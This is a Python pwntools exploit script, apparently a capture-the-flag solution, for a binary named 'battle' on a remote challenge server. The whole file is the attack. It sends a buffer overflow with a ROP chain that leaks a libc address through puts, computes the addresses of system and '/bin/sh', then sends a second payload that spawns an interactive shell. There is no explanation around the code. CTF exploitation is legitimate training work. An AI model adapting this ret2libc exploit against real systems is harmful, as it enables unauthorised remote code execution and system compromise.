from pwn import * 
puts_plt = 0x8049150
main = 0x80493c5
start_main = 0x0804c028
pop = 0x08049022 #pop ebx ; ret
#p = process("./battle")
p = remote("ctf.pragyan.org",12500)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + ")"*1 + chr(40) * 8 + chr(80))
p.sendline("F")
payload = ""
payload += "A"*112
payload += p32(puts_plt)
payload += p32(pop)
payload += p32(start_main)
payload += p32(main)
#gdb.attach(p)
p.sendline(payload)
p.recvuntil("Leaderboard: ")
p.recvline()
data = p.recvline()
data = data[:4]
leak = u32(data)
print hex(leak)
base = leak - 0x00018d90
system = base + 0x03cd10
binsh = base + 0x17b8cf
print "base: ",hex(base)
print "system: " ,hex(system)
print "binsh: ",hex(binsh)
payload = ""
payload += "A"*112
payload += p32(system)
payload += "AAAA"
payload += p32(binsh)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + "A"*100)
p.sendline("A" + ")"*1 + chr(40) * 8 + chr(80))
p.sendline("F")
#gdb.attach(p)
p.sendline(payload)
p.interactive()
